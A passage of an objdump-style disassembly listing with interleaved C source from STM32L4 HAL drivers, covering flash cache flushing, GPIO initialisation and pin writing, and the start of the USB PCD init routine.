 8001836:	695b      	ldr	r3, [r3, #20]
 8001838:	4a07      	ldr	r2, [pc, #28]	; (8001858 <FLASH_PageErase+0x44>)
 800183a:	f043 0302 	orr.w	r3, r3, #2
 800183e:	6153      	str	r3, [r2, #20]
  SET_BIT(FLASH->CR, FLASH_CR_STRT);
 8001840:	4b05      	ldr	r3, [pc, #20]	; (8001858 <FLASH_PageErase+0x44>)
 8001842:	695b      	ldr	r3, [r3, #20]
 8001844:	4a04      	ldr	r2, [pc, #16]	; (8001858 <FLASH_PageErase+0x44>)
 8001846:	f443 3380 	orr.w	r3, r3, #65536	; 0x10000
 800184a:	6153      	str	r3, [r2, #20]
}
 800184c:	bf00      	nop
 800184e:	370c      	adds	r7, #12
 8001850:	46bd      	mov	sp, r7
 8001852:	f85d 7b04 	ldr.w	r7, [sp], #4
 8001856:	4770      	bx	lr
 8001858:	40022000 	.word	0x40022000

0800185c <FLASH_FlushCaches>:
/**
  * @brief  Flush the instruction and data caches.
  * @retval None
  */
void FLASH_FlushCaches(void)
{
 800185c:	b480      	push	{r7}
 800185e:	b083      	sub	sp, #12
 8001860:	af00      	add	r7, sp, #0
  FLASH_CacheTypeDef cache = pFlash.CacheToReactivate;
 8001862:	4b21      	ldr	r3, [pc, #132]	; (80018e8 <FLASH_FlushCaches+0x8c>)
 8001864:	7f1b      	ldrb	r3, [r3, #28]
 8001866:	71fb      	strb	r3, [r7, #7]

  /* Flush instruction cache  */
  if((cache == FLASH_CACHE_ICACHE_ENABLED) ||
 8001868:	79fb      	ldrb	r3, [r7, #7]
 800186a:	2b01      	cmp	r3, #1
 800186c:	d002      	beq.n	8001874 <FLASH_FlushCaches+0x18>
 800186e:	79fb      	ldrb	r3, [r7, #7]
 8001870:	2b03      	cmp	r3, #3
 8001872:	d117      	bne.n	80018a4 <FLASH_FlushCaches+0x48>
     (cache == FLASH_CACHE_ICACHE_DCACHE_ENABLED))
  {
    /* Disable instruction cache */
    __HAL_FLASH_INSTRUCTION_CACHE_DISABLE();
 8001874:	4b1d      	ldr	r3, [pc, #116]	; (80018ec <FLASH_FlushCaches+0x90>)
 8001876:	681b      	ldr	r3, [r3, #0]
 8001878:	4a1c      	ldr	r2, [pc, #112]	; (80018ec <FLASH_FlushCaches+0x90>)
 800187a:	f423 7300 	bic.w	r3, r3, #512	; 0x200
 800187e:	6013      	str	r3, [r2, #0]
    /* Reset instruction cache */
    __HAL_FLASH_INSTRUCTION_CACHE_RESET();
 8001880:	4b1a      	ldr	r3, [pc, #104]	; (80018ec <FLASH_FlushCaches+0x90>)
 8001882:	681b      	ldr	r3, [r3, #0]
 8001884:	4a19      	ldr	r2, [pc, #100]	; (80018ec <FLASH_FlushCaches+0x90>)
 8001886:	f443 6300 	orr.w	r3, r3, #2048	; 0x800
 800188a:	6013      	str	r3, [r2, #0]
 800188c:	4b17      	ldr	r3, [pc, #92]	; (80018ec <FLASH_FlushCaches+0x90>)
 800188e:	681b      	ldr	r3, [r3, #0]
 8001890:	4a16      	ldr	r2, [pc, #88]	; (80018ec <FLASH_FlushCaches+0x90>)
 8001892:	f423 6300 	bic.w	r3, r3, #2048	; 0x800
 8001896:	6013      	str	r3, [r2, #0]
    /* Enable instruction cache */
    __HAL_FLASH_INSTRUCTION_CACHE_ENABLE();
 8001898:	4b14      	ldr	r3, [pc, #80]	; (80018ec <FLASH_FlushCaches+0x90>)
 800189a:	681b      	ldr	r3, [r3, #0]
 800189c:	4a13      	ldr	r2, [pc, #76]	; (80018ec <FLASH_FlushCaches+0x90>)
 800189e:	f443 7300 	orr.w	r3, r3, #512	; 0x200
 80018a2:	6013      	str	r3, [r2, #0]
  }

  /* Flush data cache */
  if((cache == FLASH_CACHE_DCACHE_ENABLED) ||
 80018a4:	79fb      	ldrb	r3, [r7, #7]
 80018a6:	2b02      	cmp	r3, #2
 80018a8:	d002      	beq.n	80018b0 <FLASH_FlushCaches+0x54>
 80018aa:	79fb      	ldrb	r3, [r7, #7]
 80018ac:	2b03      	cmp	r3, #3
 80018ae:	d111      	bne.n	80018d4 <FLASH_FlushCaches+0x78>
     (cache == FLASH_CACHE_ICACHE_DCACHE_ENABLED))
  {
    /* Reset data cache */
    __HAL_FLASH_DATA_CACHE_RESET();
 80018b0:	4b0e      	ldr	r3, [pc, #56]	; (80018ec <FLASH_FlushCaches+0x90>)
 80018b2:	681b      	ldr	r3, [r3, #0]
 80018b4:	4a0d      	ldr	r2, [pc, #52]	; (80018ec <FLASH_FlushCaches+0x90>)
 80018b6:	f443 5380 	orr.w	r3, r3, #4096	; 0x1000
 80018ba:	6013      	str	r3, [r2, #0]
 80018bc:	4b0b      	ldr	r3, [pc, #44]	; (80018ec <FLASH_FlushCaches+0x90>)
 80018be:	681b      	ldr	r3, [r3, #0]
 80018c0:	4a0a      	ldr	r2, [pc, #40]	; (80018ec <FLASH_FlushCaches+0x90>)
 80018c2:	f423 5380 	bic.w	r3, r3, #4096	; 0x1000
 80018c6:	6013      	str	r3, [r2, #0]
    /* Enable data cache */
    __HAL_FLASH_DATA_CACHE_ENABLE();
 80018c8:	4b08      	ldr	r3, [pc, #32]	; (80018ec <FLASH_FlushCaches+0x90>)
 80018ca:	681b      	ldr	r3, [r3, #0]
 80018cc:	4a07      	ldr	r2, [pc, #28]	; (80018ec <FLASH_FlushCaches+0x90>)
 80018ce:	f443 6380 	orr.w	r3, r3, #1024	; 0x400
 80018d2:	6013      	str	r3, [r2, #0]
  }

  /* Reset internal variable */
  pFlash.CacheToReactivate = FLASH_CACHE_DISABLED;
 80018d4:	4b04      	ldr	r3, [pc, #16]	; (80018e8 <FLASH_FlushCaches+0x8c>)
 80018d6:	2200      	movs	r2, #0
 80018d8:	771a      	strb	r2, [r3, #28]
}
 80018da:	bf00      	nop
 80018dc:	370c      	adds	r7, #12
 80018de:	46bd      	mov	sp, r7
 80018e0:	f85d 7b04 	ldr.w	r7, [sp], #4
 80018e4:	4770      	bx	lr
 80018e6:	bf00      	nop
 80018e8:	2000000c 	.word	0x2000000c
 80018ec:	40022000 	.word	0x40022000

080018f0 <HAL_GPIO_Init>:
  * @param  GPIO_Init pointer to a GPIO_InitTypeDef structure that contains
  *         the configuration information for the specified GPIO peripheral.
  * @retval None
  */
void HAL_GPIO_Init(GPIO_TypeDef  *GPIOx, GPIO_InitTypeDef *GPIO_Init)
{
 80018f0:	b480      	push	{r7}
 80018f2:	b087      	sub	sp, #28
 80018f4:	af00      	add	r7, sp, #0
 80018f6:	6078      	str	r0, [r7, #4]
 80018f8:	6039      	str	r1, [r7, #0]
  uint32_t position = 0x00u;
 80018fa:	2300      	movs	r3, #0
 80018fc:	617b      	str	r3, [r7, #20]
  assert_param(IS_GPIO_ALL_INSTANCE(GPIOx));
  assert_param(IS_GPIO_PIN(GPIO_Init->Pin));
  assert_param(IS_GPIO_MODE(GPIO_Init->Mode));

  /* Configure the port pins */
  while (((GPIO_Init->Pin) >> position) != 0x00u)
 80018fe:	e148      	b.n	8001b92 <HAL_GPIO_Init+0x2a2>
  {
    /* Get current io position */
    iocurrent = (GPIO_Init->Pin) & (1uL << position);
 8001900:	683b      	ldr	r3, [r7, #0]
 8001902:	681a      	ldr	r2, [r3, #0]
 8001904:	2101      	movs	r1, #1
 8001906:	697b      	ldr	r3, [r7, #20]
 8001908:	fa01 f303 	lsl.w	r3, r1, r3
 800190c:	4013      	ands	r3, r2
 800190e:	60fb      	str	r3, [r7, #12]

    if (iocurrent != 0x00u)
 8001910:	68fb      	ldr	r3, [r7, #12]
 8001912:	2b00      	cmp	r3, #0
 8001914:	f000 813a 	beq.w	8001b8c <HAL_GPIO_Init+0x29c>
    {
      /*--------------------- GPIO Mode Configuration ------------------------*/
      /* In case of Output or Alternate function mode selection */
      if (((GPIO_Init->Mode & GPIO_MODE) == MODE_OUTPUT) || ((GPIO_Init->Mode & GPIO_MODE) == MODE_AF))
 8001918:	683b      	ldr	r3, [r7, #0]
 800191a:	685b      	ldr	r3, [r3, #4]
 800191c:	f003 0303 	and.w	r3, r3, #3
 8001920:	2b01      	cmp	r3, #1
 8001922:	d005      	beq.n	8001930 <HAL_GPIO_Init+0x40>
 8001924:	683b      	ldr	r3, [r7, #0]
 8001926:	685b      	ldr	r3, [r3, #4]
 8001928:	f003 0303 	and.w	r3, r3, #3
 800192c:	2b02      	cmp	r3, #2
 800192e:	d130      	bne.n	8001992 <HAL_GPIO_Init+0xa2>
      {
        /* Check the Speed parameter */
        assert_param(IS_GPIO_SPEED(GPIO_Init->Speed));

        /* Configure the IO Speed */
        temp = GPIOx->OSPEEDR;
 8001930:	687b      	ldr	r3, [r7, #4]
 8001932:	689b      	ldr	r3, [r3, #8]
 8001934:	613b      	str	r3, [r7, #16]
        temp &= ~(GPIO_OSPEEDR_OSPEED0 << (position * 2u));
 8001936:	697b      	ldr	r3, [r7, #20]
 8001938:	005b      	lsls	r3, r3, #1
 800193a:	2203      	movs	r2, #3
 800193c:	fa02 f303 	lsl.w	r3, r2, r3
 8001940:	43db      	mvns	r3, r3
 8001942:	693a      	ldr	r2, [r7, #16]
 8001944:	4013      	ands	r3, r2
 8001946:	613b      	str	r3, [r7, #16]
        temp |= (GPIO_Init->Speed << (position * 2u));
 8001948:	683b      	ldr	r3, [r7, #0]
 800194a:	68da      	ldr	r2, [r3, #12]
 800194c:	697b      	ldr	r3, [r7, #20]
 800194e:	005b      	lsls	r3, r3, #1
 8001950:	fa02 f303 	lsl.w	r3, r2, r3
 8001954:	693a      	ldr	r2, [r7, #16]
 8001956:	4313      	orrs	r3, r2
 8001958:	613b      	str	r3, [r7, #16]
        GPIOx->OSPEEDR = temp;
 800195a:	687b      	ldr	r3, [r7, #4]
 800195c:	693a      	ldr	r2, [r7, #16]
 800195e:	609a      	str	r2, [r3, #8]

        /* Configure the IO Output Type */
        temp = GPIOx->OTYPER;
 8001960:	687b      	ldr	r3, [r7, #4]
 8001962:	685b      	ldr	r3, [r3, #4]
 8001964:	613b      	str	r3, [r7, #16]
        temp &= ~(GPIO_OTYPER_OT0 << position) ;
 8001966:	2201      	movs	r2, #1
 8001968:	697b      	ldr	r3, [r7, #20]
 800196a:	fa02 f303 	lsl.w	r3, r2, r3
 800196e:	43db      	mvns	r3, r3
 8001970:	693a      	ldr	r2, [r7, #16]
 8001972:	4013      	ands	r3, r2
 8001974:	613b      	str	r3, [r7, #16]
        temp |= (((GPIO_Init->Mode & OUTPUT_TYPE) >> OUTPUT_TYPE_Pos) << position);
 8001976:	683b      	ldr	r3, [r7, #0]
 8001978:	685b      	ldr	r3, [r3, #4]
 800197a:	091b      	lsrs	r3, r3, #4
 800197c:	f003 0201 	and.w	r2, r3, #1
 8001980:	697b      	ldr	r3, [r7, #20]
 8001982:	fa02 f303 	lsl.w	r3, r2, r3
 8001986:	693a      	ldr	r2, [r7, #16]
 8001988:	4313      	orrs	r3, r2
 800198a:	613b      	str	r3, [r7, #16]
        GPIOx->OTYPER = temp;
 800198c:	687b      	ldr	r3, [r7, #4]
 800198e:	693a      	ldr	r2, [r7, #16]
 8001990:	605a      	str	r2, [r3, #4]
      }

#endif /* STM32L471xx || STM32L475xx || STM32L476xx || STM32L485xx || STM32L486xx */

      /* Activate the Pull-up or Pull down resistor for the current IO */
      if ((GPIO_Init->Mode & GPIO_MODE) != MODE_ANALOG)
 8001992:	683b      	ldr	r3, [r7, #0]
 8001994:	685b      	ldr	r3, [r3, #4]
 8001996:	f003 0303 	and.w	r3, r3, #3
 800199a:	2b03      	cmp	r3, #3
 800199c:	d017      	beq.n	80019ce <HAL_GPIO_Init+0xde>
      {
        /* Check the Pull parameter */
        assert_param(IS_GPIO_PULL(GPIO_Init->Pull));

        temp = GPIOx->PUPDR;
 800199e:	687b      	ldr	r3, [r7, #4]
 80019a0:	68db      	ldr	r3, [r3, #12]
 80019a2:	613b      	str	r3, [r7, #16]
        temp &= ~(GPIO_PUPDR_PUPD0 << (position * 2U));
 80019a4:	697b      	ldr	r3, [r7, #20]
 80019a6:	005b      	lsls	r3, r3, #1
 80019a8:	2203      	movs	r2, #3
 80019aa:	fa02 f303 	lsl.w	r3, r2, r3
 80019ae:	43db      	mvns	r3, r3
 80019b0:	693a      	ldr	r2, [r7, #16]
 80019b2:	4013      	ands	r3, r2
 80019b4:	613b      	str	r3, [r7, #16]
        temp |= ((GPIO_Init->Pull) << (position * 2U));
 80019b6:	683b      	ldr	r3, [r7, #0]
 80019b8:	689a      	ldr	r2, [r3, #8]
 80019ba:	697b      	ldr	r3, [r7, #20]
 80019bc:	005b      	lsls	r3, r3, #1
 80019be:	fa02 f303 	lsl.w	r3, r2, r3
 80019c2:	693a      	ldr	r2, [r7, #16]
 80019c4:	4313      	orrs	r3, r2
 80019c6:	613b      	str	r3, [r7, #16]
        GPIOx->PUPDR = temp;
 80019c8:	687b      	ldr	r3, [r7, #4]
 80019ca:	693a      	ldr	r2, [r7, #16]
 80019cc:	60da      	str	r2, [r3, #12]
      }

      /* In case of Alternate function mode selection */
      if ((GPIO_Init->Mode & GPIO_MODE) == MODE_AF)
 80019ce:	683b      	ldr	r3, [r7, #0]
 80019d0:	685b      	ldr	r3, [r3, #4]
 80019d2:	f003 0303 	and.w	r3, r3, #3
 80019d6:	2b02      	cmp	r3, #2
 80019d8:	d123      	bne.n	8001a22 <HAL_GPIO_Init+0x132>
        /* Check the Alternate function parameters */
        assert_param(IS_GPIO_AF_INSTANCE(GPIOx));
        assert_param(IS_GPIO_AF(GPIO_Init->Alternate));

        /* Configure Alternate function mapped with the current IO */
        temp = GPIOx->AFR[position >> 3u];
 80019da:	697b      	ldr	r3, [r7, #20]
 80019dc:	08da      	lsrs	r2, r3, #3
 80019de:	687b      	ldr	r3, [r7, #4]
 80019e0:	3208      	adds	r2, #8
 80019e2:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 80019e6:	613b      	str	r3, [r7, #16]
        temp &= ~(0xFu << ((position & 0x07u) * 4u));
 80019e8:	697b      	ldr	r3, [r7, #20]
 80019ea:	f003 0307 	and.w	r3, r3, #7
 80019ee:	009b      	lsls	r3, r3, #2
 80019f0:	220f      	movs	r2, #15
 80019f2:	fa02 f303 	lsl.w	r3, r2, r3
 80019f6:	43db      	mvns	r3, r3
 80019f8:	693a      	ldr	r2, [r7, #16]
 80019fa:	4013      	ands	r3, r2
 80019fc:	613b      	str	r3, [r7, #16]
        temp |= ((GPIO_Init->Alternate) << ((position & 0x07u) * 4u));
 80019fe:	683b      	ldr	r3, [r7, #0]
 8001a00:	691a      	ldr	r2, [r3, #16]
 8001a02:	697b      	ldr	r3, [r7, #20]
 8001a04:	f003 0307 	and.w	r3, r3, #7
 8001a08:	009b      	lsls	r3, r3, #2
 8001a0a:	fa02 f303 	lsl.w	r3, r2, r3
 8001a0e:	693a      	ldr	r2, [r7, #16]
 8001a10:	4313      	orrs	r3, r2
 8001a12:	613b      	str	r3, [r7, #16]
        GPIOx->AFR[position >> 3u] = temp;
 8001a14:	697b      	ldr	r3, [r7, #20]
 8001a16:	08da      	lsrs	r2, r3, #3
 8001a18:	687b      	ldr	r3, [r7, #4]
 8001a1a:	3208      	adds	r2, #8
 8001a1c:	6939      	ldr	r1, [r7, #16]
 8001a1e:	f843 1022 	str.w	r1, [r3, r2, lsl #2]
      }

      /* Configure IO Direction mode (Input, Output, Alternate or Analog) */
      temp = GPIOx->MODER;
 8001a22:	687b      	ldr	r3, [r7, #4]
 8001a24:	681b      	ldr	r3, [r3, #0]
 8001a26:	613b      	str	r3, [r7, #16]
      temp &= ~(GPIO_MODER_MODE0 << (position * 2u));
 8001a28:	697b      	ldr	r3, [r7, #20]
 8001a2a:	005b      	lsls	r3, r3, #1
 8001a2c:	2203      	movs	r2, #3
 8001a2e:	fa02 f303 	lsl.w	r3, r2, r3
 8001a32:	43db      	mvns	r3, r3
 8001a34:	693a      	ldr	r2, [r7, #16]
 8001a36:	4013      	ands	r3, r2
 8001a38:	613b      	str	r3, [r7, #16]
      temp |= ((GPIO_Init->Mode & GPIO_MODE) << (position * 2u));
 8001a3a:	683b      	ldr	r3, [r7, #0]
 8001a3c:	685b      	ldr	r3, [r3, #4]
 8001a3e:	f003 0203 	and.w	r2, r3, #3
 8001a42:	697b      	ldr	r3, [r7, #20]
 8001a44:	005b      	lsls	r3, r3, #1
 8001a46:	fa02 f303 	lsl.w	r3, r2, r3
 8001a4a:	693a      	ldr	r2, [r7, #16]
 8001a4c:	4313      	orrs	r3, r2
 8001a4e:	613b      	str	r3, [r7, #16]
      GPIOx->MODER = temp;
 8001a50:	687b      	ldr	r3, [r7, #4]
 8001a52:	693a      	ldr	r2, [r7, #16]
 8001a54:	601a      	str	r2, [r3, #0]

      /*--------------------- EXTI Mode Configuration ------------------------*/
      /* Configure the External Interrupt or event for the current IO */
      if ((GPIO_Init->Mode & EXTI_MODE) != 0x00u)
 8001a56:	683b      	ldr	r3, [r7, #0]
 8001a58:	685b      	ldr	r3, [r3, #4]
 8001a5a:	f403 3340 	and.w	r3, r3, #196608	; 0x30000
 8001a5e:	2b00      	cmp	r3, #0
 8001a60:	f000 8094 	beq.w	8001b8c <HAL_GPIO_Init+0x29c>
      {
        /* Enable SYSCFG Clock */
        __HAL_RCC_SYSCFG_CLK_ENABLE();
 8001a64:	4b52      	ldr	r3, [pc, #328]	; (8001bb0 <HAL_GPIO_Init+0x2c0>)
 8001a66:	6e1b      	ldr	r3, [r3, #96]	; 0x60
 8001a68:	4a51      	ldr	r2, [pc, #324]	; (8001bb0 <HAL_GPIO_Init+0x2c0>)
 8001a6a:	f043 0301 	orr.w	r3, r3, #1
 8001a6e:	6613      	str	r3, [r2, #96]	; 0x60
 8001a70:	4b4f      	ldr	r3, [pc, #316]	; (8001bb0 <HAL_GPIO_Init+0x2c0>)
 8001a72:	6e1b      	ldr	r3, [r3, #96]	; 0x60
 8001a74:	f003 0301 	and.w	r3, r3, #1
 8001a78:	60bb      	str	r3, [r7, #8]
 8001a7a:	68bb      	ldr	r3, [r7, #8]

        temp = SYSCFG->EXTICR[position >> 2u];
 8001a7c:	4a4d      	ldr	r2, [pc, #308]	; (8001bb4 <HAL_GPIO_Init+0x2c4>)
 8001a7e:	697b      	ldr	r3, [r7, #20]
 8001a80:	089b      	lsrs	r3, r3, #2
 8001a82:	3302      	adds	r3, #2
 8001a84:	f852 3023 	ldr.w	r3, [r2, r3, lsl #2]
 8001a88:	613b      	str	r3, [r7, #16]
        temp &= ~(0x0FuL << (4u * (position & 0x03u)));
 8001a8a:	697b      	ldr	r3, [r7, #20]
 8001a8c:	f003 0303 	and.w	r3, r3, #3
 8001a90:	009b      	lsls	r3, r3, #2
 8001a92:	220f      	movs	r2, #15
 8001a94:	fa02 f303 	lsl.w	r3, r2, r3
 8001a98:	43db      	mvns	r3, r3
 8001a9a:	693a      	ldr	r2, [r7, #16]
 8001a9c:	4013      	ands	r3, r2
 8001a9e:	613b      	str	r3, [r7, #16]
        temp |= (GPIO_GET_INDEX(GPIOx) << (4u * (position & 0x03u)));
 8001aa0:	687b      	ldr	r3, [r7, #4]
 8001aa2:	f1b3 4f90 	cmp.w	r3, #1207959552	; 0x48000000
 8001aa6:	d00d      	beq.n	8001ac4 <HAL_GPIO_Init+0x1d4>
 8001aa8:	687b      	ldr	r3, [r7, #4]
 8001aaa:	4a43      	ldr	r2, [pc, #268]	; (8001bb8 <HAL_GPIO_Init+0x2c8>)
 8001aac:	4293      	cmp	r3, r2
 8001aae:	d007      	beq.n	8001ac0 <HAL_GPIO_Init+0x1d0>
 8001ab0:	687b      	ldr	r3, [r7, #4]
 8001ab2:	4a42      	ldr	r2, [pc, #264]	; (8001bbc <HAL_GPIO_Init+0x2cc>)
 8001ab4:	4293      	cmp	r3, r2
 8001ab6:	d101      	bne.n	8001abc <HAL_GPIO_Init+0x1cc>
 8001ab8:	2302      	movs	r3, #2
 8001aba:	e004      	b.n	8001ac6 <HAL_GPIO_Init+0x1d6>
 8001abc:	2307      	movs	r3, #7
 8001abe:	e002      	b.n	8001ac6 <HAL_GPIO_Init+0x1d6>
 8001ac0:	2301      	movs	r3, #1
 8001ac2:	e000      	b.n	8001ac6 <HAL_GPIO_Init+0x1d6>
 8001ac4:	2300      	movs	r3, #0
 8001ac6:	697a      	ldr	r2, [r7, #20]
 8001ac8:	f002 0203 	and.w	r2, r2, #3
 8001acc:	0092      	lsls	r2, r2, #2
 8001ace:	4093      	lsls	r3, r2
 8001ad0:	693a      	ldr	r2, [r7, #16]
 8001ad2:	4313      	orrs	r3, r2
 8001ad4:	613b      	str	r3, [r7, #16]
        SYSCFG->EXTICR[position >> 2u] = temp;
 8001ad6:	4937      	ldr	r1, [pc, #220]	; (8001bb4 <HAL_GPIO_Init+0x2c4>)
 8001ad8:	697b      	ldr	r3, [r7, #20]
 8001ada:	089b      	lsrs	r3, r3, #2
 8001adc:	3302      	adds	r3, #2
 8001ade:	693a      	ldr	r2, [r7, #16]
 8001ae0:	f841 2023 	str.w	r2, [r1, r3, lsl #2]

        /* Clear Rising Falling edge configuration */
        temp = EXTI->RTSR1;
 8001ae4:	4b36      	ldr	r3, [pc, #216]	; (8001bc0 <HAL_GPIO_Init+0x2d0>)
 8001ae6:	689b      	ldr	r3, [r3, #8]
 8001ae8:	613b      	str	r3, [r7, #16]
        temp &= ~(iocurrent);
 8001aea:	68fb      	ldr	r3, [r7, #12]
 8001aec:	43db      	mvns	r3, r3
 8001aee:	693a      	ldr	r2, [r7, #16]
 8001af0:	4013      	ands	r3, r2
 8001af2:	613b      	str	r3, [r7, #16]
        if ((GPIO_Init->Mode & TRIGGER_RISING) != 0x00u)
 8001af4:	683b      	ldr	r3, [r7, #0]
 8001af6:	685b      	ldr	r3, [r3, #4]
 8001af8:	f403 1380 	and.w	r3, r3, #1048576	; 0x100000
 8001afc:	2b00      	cmp	r3, #0
 8001afe:	d003      	beq.n	8001b08 <HAL_GPIO_Init+0x218>
        {
          temp |= iocurrent;
 8001b00:	693a      	ldr	r2, [r7, #16]
 8001b02:	68fb      	ldr	r3, [r7, #12]
 8001b04:	4313      	orrs	r3, r2
 8001b06:	613b      	str	r3, [r7, #16]
        }
        EXTI->RTSR1 = temp;
 8001b08:	4a2d      	ldr	r2, [pc, #180]	; (8001bc0 <HAL_GPIO_Init+0x2d0>)
 8001b0a:	693b      	ldr	r3, [r7, #16]
 8001b0c:	6093      	str	r3, [r2, #8]

        temp = EXTI->FTSR1;
 8001b0e:	4b2c      	ldr	r3, [pc, #176]	; (8001bc0 <HAL_GPIO_Init+0x2d0>)
 8001b10:	68db      	ldr	r3, [r3, #12]
 8001b12:	613b      	str	r3, [r7, #16]
        temp &= ~(iocurrent);
 8001b14:	68fb      	ldr	r3, [r7, #12]
 8001b16:	43db      	mvns	r3, r3
 8001b18:	693a      	ldr	r2, [r7, #16]
 8001b1a:	4013      	ands	r3, r2
 8001b1c:	613b      	str	r3, [r7, #16]
        if ((GPIO_Init->Mode & TRIGGER_FALLING) != 0x00u)
 8001b1e:	683b      	ldr	r3, [r7, #0]
 8001b20:	685b      	ldr	r3, [r3, #4]
 8001b22:	f403 1300 	and.w	r3, r3, #2097152	; 0x200000
 8001b26:	2b00      	cmp	r3, #0
 8001b28:	d003      	beq.n	8001b32 <HAL_GPIO_Init+0x242>
        {
          temp |= iocurrent;
 8001b2a:	693a      	ldr	r2, [r7, #16]
 8001b2c:	68fb      	ldr	r3, [r7, #12]
 8001b2e:	4313      	orrs	r3, r2
 8001b30:	613b      	str	r3, [r7, #16]
        }
        EXTI->FTSR1 = temp;
 8001b32:	4a23      	ldr	r2, [pc, #140]	; (8001bc0 <HAL_GPIO_Init+0x2d0>)
 8001b34:	693b      	ldr	r3, [r7, #16]
 8001b36:	60d3      	str	r3, [r2, #12]

        /* Clear EXTI line configuration */
        temp = EXTI->EMR1;
 8001b38:	4b21      	ldr	r3, [pc, #132]	; (8001bc0 <HAL_GPIO_Init+0x2d0>)
 8001b3a:	685b      	ldr	r3, [r3, #4]
 8001b3c:	613b      	str	r3, [r7, #16]
        temp &= ~(iocurrent);
 8001b3e:	68fb      	ldr	r3, [r7, #12]
 8001b40:	43db      	mvns	r3, r3
 8001b42:	693a      	ldr	r2, [r7, #16]
 8001b44:	4013      	ands	r3, r2
 8001b46:	613b      	str	r3, [r7, #16]
        if ((GPIO_Init->Mode & EXTI_EVT) != 0x00u)
 8001b48:	683b      	ldr	r3, [r7, #0]
 8001b4a:	685b      	ldr	r3, [r3, #4]
 8001b4c:	f403 3300 	and.w	r3, r3, #131072	; 0x20000
 8001b50:	2b00      	cmp	r3, #0
 8001b52:	d003      	beq.n	8001b5c <HAL_GPIO_Init+0x26c>
        {
          temp |= iocurrent;
 8001b54:	693a      	ldr	r2, [r7, #16]
 8001b56:	68fb      	ldr	r3, [r7, #12]
 8001b58:	4313      	orrs	r3, r2
 8001b5a:	613b      	str	r3, [r7, #16]
        }
        EXTI->EMR1 = temp;
 8001b5c:	4a18      	ldr	r2, [pc, #96]	; (8001bc0 <HAL_GPIO_Init+0x2d0>)
 8001b5e:	693b      	ldr	r3, [r7, #16]
 8001b60:	6053      	str	r3, [r2, #4]

        temp = EXTI->IMR1;
 8001b62:	4b17      	ldr	r3, [pc, #92]	; (8001bc0 <HAL_GPIO_Init+0x2d0>)
 8001b64:	681b      	ldr	r3, [r3, #0]
 8001b66:	613b      	str	r3, [r7, #16]
        temp &= ~(iocurrent);
 8001b68:	68fb      	ldr	r3, [r7, #12]
 8001b6a:	43db      	mvns	r3, r3
 8001b6c:	693a      	ldr	r2, [r7, #16]
 8001b6e:	4013      	ands	r3, r2
 8001b70:	613b      	str	r3, [r7, #16]
        if ((GPIO_Init->Mode & EXTI_IT) != 0x00u)
 8001b72:	683b      	ldr	r3, [r7, #0]
 8001b74:	685b      	ldr	r3, [r3, #4]
 8001b76:	f403 3380 	and.w	r3, r3, #65536	; 0x10000
 8001b7a:	2b00      	cmp	r3, #0
 8001b7c:	d003      	beq.n	8001b86 <HAL_GPIO_Init+0x296>
        {
          temp |= iocurrent;
 8001b7e:	693a      	ldr	r2, [r7, #16]
 8001b80:	68fb      	ldr	r3, [r7, #12]
 8001b82:	4313      	orrs	r3, r2
 8001b84:	613b      	str	r3, [r7, #16]
        }
        EXTI->IMR1 = temp;
 8001b86:	4a0e      	ldr	r2, [pc, #56]	; (8001bc0 <HAL_GPIO_Init+0x2d0>)
 8001b88:	693b      	ldr	r3, [r7, #16]
 8001b8a:	6013      	str	r3, [r2, #0]
      }
    }

    position++;
 8001b8c:	697b      	ldr	r3, [r7, #20]
 8001b8e:	3301      	adds	r3, #1
 8001b90:	617b      	str	r3, [r7, #20]
  while (((GPIO_Init->Pin) >> position) != 0x00u)
 8001b92:	683b      	ldr	r3, [r7, #0]
 8001b94:	681a      	ldr	r2, [r3, #0]
 8001b96:	697b      	ldr	r3, [r7, #20]
 8001b98:	fa22 f303 	lsr.w	r3, r2, r3
 8001b9c:	2b00      	cmp	r3, #0
 8001b9e:	f47f aeaf 	bne.w	8001900 <HAL_GPIO_Init+0x10>
  }
}
 8001ba2:	bf00      	nop
 8001ba4:	bf00      	nop
 8001ba6:	371c      	adds	r7, #28
 8001ba8:	46bd      	mov	sp, r7
 8001baa:	f85d 7b04 	ldr.w	r7, [sp], #4
 8001bae:	4770      	bx	lr
 8001bb0:	40021000 	.word	0x40021000
 8001bb4:	40010000 	.word	0x40010000
 8001bb8:	48000400 	.word	0x48000400
 8001bbc:	48000800 	.word	0x48000800
 8001bc0:	40010400 	.word	0x40010400

08001bc4 <HAL_GPIO_WritePin>:
  *            @arg GPIO_PIN_RESET: to clear the port pin
  *            @arg GPIO_PIN_SET: to set the port pin
  * @retval None
  */
void HAL_GPIO_WritePin(GPIO_TypeDef* GPIOx, uint16_t GPIO_Pin, GPIO_PinState PinState)
{
 8001bc4:	b480      	push	{r7}
 8001bc6:	b083      	sub	sp, #12
 8001bc8:	af00      	add	r7, sp, #0
 8001bca:	6078      	str	r0, [r7, #4]
 8001bcc:	460b      	mov	r3, r1
 8001bce:	807b      	strh	r3, [r7, #2]
 8001bd0:	4613      	mov	r3, r2
 8001bd2:	707b      	strb	r3, [r7, #1]
  /* Check the parameters */
  assert_param(IS_GPIO_PIN(GPIO_Pin));
  assert_param(IS_GPIO_PIN_ACTION(PinState));

  if(PinState != GPIO_PIN_RESET)
 8001bd4:	787b      	ldrb	r3, [r7, #1]
 8001bd6:	2b00      	cmp	r3, #0
 8001bd8:	d003      	beq.n	8001be2 <HAL_GPIO_WritePin+0x1e>
  {
    GPIOx->BSRR = (uint32_t)GPIO_Pin;
 8001bda:	887a      	ldrh	r2, [r7, #2]
 8001bdc:	687b      	ldr	r3, [r7, #4]
 8001bde:	619a      	str	r2, [r3, #24]
  }
  else
  {
    GPIOx->BRR = (uint32_t)GPIO_Pin;
  }
}
 8001be0:	e002      	b.n	8001be8 <HAL_GPIO_WritePin+0x24>
    GPIOx->BRR = (uint32_t)GPIO_Pin;
 8001be2:	887a      	ldrh	r2, [r7, #2]
 8001be4:	687b      	ldr	r3, [r7, #4]
 8001be6:	629a      	str	r2, [r3, #40]	; 0x28
}
 8001be8:	bf00      	nop
 8001bea:	370c      	adds	r7, #12
 8001bec:	46bd      	mov	sp, r7
 8001bee:	f85d 7b04 	ldr.w	r7, [sp], #4
 8001bf2:	4770      	bx	lr

08001bf4 <HAL_PCD_Init>:
  *         parameters in the PCD_InitTypeDef and initialize the associated handle.
  * @param  hpcd PCD handle
  * @retval HAL status
  */
HAL_StatusTypeDef HAL_PCD_Init(PCD_HandleTypeDef *hpcd)
{
 8001bf4:	b5f0      	push	{r4, r5, r6, r7, lr}
 8001bf6:	b08b      	sub	sp, #44	; 0x2c
